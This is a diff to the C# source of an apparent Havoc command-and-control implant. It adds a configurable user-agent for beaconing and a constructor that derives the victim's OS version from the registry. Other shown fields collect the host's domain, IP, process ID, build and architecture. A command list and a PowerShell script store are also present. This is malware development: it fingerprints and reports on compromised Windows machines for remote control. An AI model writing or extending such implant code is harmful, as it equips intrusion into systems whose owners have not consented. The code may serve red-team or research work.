@@ -21,6 +21,7 @@ namespace HavocImplant
     {
         // Altered by build
         public string[] url = Config.url;
+        public string userAgent = Config.userAgent;
         public int timeout = Config.timeout;
         public int sleepTime = Config.sleepTime;
         public int maxTries = Config.maxTries;
@@ -54,17 +55,29 @@ namespace HavocImplant
         public string domainName = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
         public string IP = getIPv4();
         public string PID = Process.GetCurrentProcess().Id.ToString();
-        public string PPID = "ppid here";
+        public string PPID = "-1";
         public string osBuild = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentBuild");
         public string osArch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
         public string processName = Process.GetCurrentProcess().ProcessName;
-        public string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
+        public string osVersion = "";
 
         // A list of instances of each command (so we can do "generic" handling)
         public static List<CommandInterface> Commands = new List<CommandInterface>();
 
         // Powershell stuff (scriptname, asciiContents)
         public Dictionary<string, string>PSScripts= new Dictionary<string, string>();
+
+        Implant()
+        {
+            string major_minor_build_rev = Environment.OSVersion.Version.ToString();
+            string servicePackVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ServicePack");
+            int idx = major_minor_build_rev.LastIndexOf('.');
+            if ("".Equals(servicePackVersion))
+            {
+                servicePackVersion = "0";
+            }
+            osVersion = major_minor_build_rev.Substring(0, idx) + "." + servicePackVersion + "." + major_minor_build_rev.Substring(idx+1);
+        }
 
         public static async Task Main() // Looping through tasks and stuff
         {
